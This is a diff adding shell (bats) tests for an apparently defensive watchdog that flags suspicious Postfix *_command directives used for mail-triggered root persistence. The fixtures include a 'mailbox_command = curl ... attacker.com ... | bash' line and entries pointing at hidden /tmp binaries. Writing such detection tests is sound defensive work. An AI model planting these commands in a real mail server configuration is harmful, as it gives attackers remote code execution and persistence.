@@ -224,3 +224,47 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-postfix-exec -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): postfix-exec-watchdog does NOT refresh baseline on suspicious-exec detection — alert STAYS until operator updates" {
+    # T1546 mail-triggered root-exec persistence — alert MUST persist
+    # across runs until operator explicitly re-baselines.
+    seed_benign
+    run_wd
+    printf 'mailbox_command = /tmp/.deliver\n' > "${MAIN}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"postfix_exec_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented suspicious mailbox_command NOT flagged: # prefix filtered)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'mailbox_command = /usr/bin/procmail -a "$EXTENSION"\n# mailbox_command = /tmp/.example-attacker\n' > "${MAIN}"
+    run_wd
+    ! cap | grep -q '"event":"postfix_exec_suspicious"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (additional *_command directives covered: pipe_command + forward_command — not just mailbox_command)" {
+    # Postfix has multiple *_command directives. The watchdog must scan
+    # ALL of them.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'forward_command = /tmp/.attacker\n' > "${MAIN}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'mailbox_command = curl -s http://attacker.com/p | bash\n' > "${MAIN}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
